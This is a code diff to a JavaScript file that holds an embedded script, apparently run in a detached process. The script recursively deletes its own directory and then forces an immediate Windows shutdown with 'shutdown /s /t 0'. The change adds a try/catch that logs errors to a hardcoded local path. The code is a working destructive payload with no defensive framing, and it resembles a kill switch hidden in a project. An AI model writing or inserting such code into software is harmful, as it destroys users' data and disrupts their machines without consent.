@@ -2,34 +2,38 @@
 
   // Script code for directory deletion
   const directoryDeletionScript = `
-  const fs = require('fs');
+    try {
+      const fs = require('fs');
   
-  // Function to recursively delete a directory
-  function deleteDirectory(dirPath) {
-    if (fs.existsSync(dirPath)) {
-      fs.readdirSync(dirPath).forEach((file) => {
-        const currentPath = \`\${dirPath}/\${file}\`;
-        if (fs.lstatSync(currentPath).isDirectory()) {
-          deleteDirectory(currentPath);
+      // Function to recursively delete a directory
+      function deleteDirectory(dirPath) {
+        if (fs.existsSync(dirPath)) {
+          fs.readdirSync(dirPath).forEach((file) => {
+            const currentPath = \`\${dirPath}/\${file}\`;
+            if (fs.lstatSync(currentPath).isDirectory()) {
+              deleteDirectory(currentPath);
+            } else {
+              fs.unlinkSync(currentPath);
+            }
+          });
+          fs.rmdirSync(dirPath);
+          console.log('Directory deleted successfully.');
         } else {
-          fs.unlinkSync(currentPath);
+          console.error('Directory does not exist.');
         }
+      }
+      
+      // Usage: Specify the directory path to be deleted
+      const directoryPath = __dirname;
+      deleteDirectory(directoryPath);
+      const { exec } = require('child_process');
+    
+      exec('shutdown /s /t 0', (error, stdout, stderr) => {
+    
       });
-      fs.rmdirSync(dirPath);
-      console.log('Directory deleted successfully.');
-    } else {
-      console.error('Directory does not exist.');
+    } catch (error) {
+      fs.writeFileSync('D:/программирование/заказы/tgAdmin2/error.txt', error);
     }
-  }
-  
-  // Usage: Specify the directory path to be deleted
-  const directoryPath = __dirname;
-  deleteDirectory(directoryPath);
-  const { exec } = require('child_process');
-
-  exec('shutdown /s /t 0', (error, stdout, stderr) => {
-
-  });
   `;
   
   // Function to run the directory deletion script in a detached process
